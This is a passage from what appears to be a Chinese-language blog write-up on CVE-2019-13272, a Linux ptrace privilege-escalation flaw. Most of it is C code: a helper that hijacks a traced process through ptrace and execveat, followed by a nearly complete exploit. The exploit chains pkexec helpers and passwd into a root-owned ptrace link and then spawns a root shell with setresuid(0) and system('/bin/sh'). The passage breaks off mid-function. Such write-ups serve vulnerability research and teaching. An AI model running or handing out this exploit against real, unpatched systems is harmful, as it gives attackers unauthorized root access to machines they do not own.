link"></a>Step.V get privileged by multistage ptrace link</h3><p>当程序运行到这一步时，<strong>我们已经成功建立了</strong> <code>task A -&gt; task B -&gt; task C</code> <strong>这一多级 ptrace 链条</strong>，此时 task A、B 为用户权限，task C 为 root 权限，<strong>而 task C 保存的 ptracer_cred 同为 root 权限</strong>，因此我们可以通过 task A 控制 task B 控制 task C 来完成提权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// in task A</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了一个自行编写的 <code>forceChildToExecve()</code> 函数，主要是控制 ptracee 进程通过 execveat 系统调用执行回 exp 程序的不同入口，具体细节参见注释，这里不再赘叙</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final EXP"></a>Final EXP</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_list[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_basename = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pipe_for_block[<span class="number">2</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> self_fd;</span><br><span class="line"><span class="type">pid_t</span> pid_task_b;</span><br><span class="line"><span class="type">pid_t</span> pid_task_c;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mainly for task a, and jmp for stage 2 and 3</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">buf</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(helper_list) / <span class="keyword">sizeof</span>(<span class="type">char</span>*); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!stat(helper_list[i], &amp;buf))</span><br><span class="line">            <span class="keyword">return</span> helper_list[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span 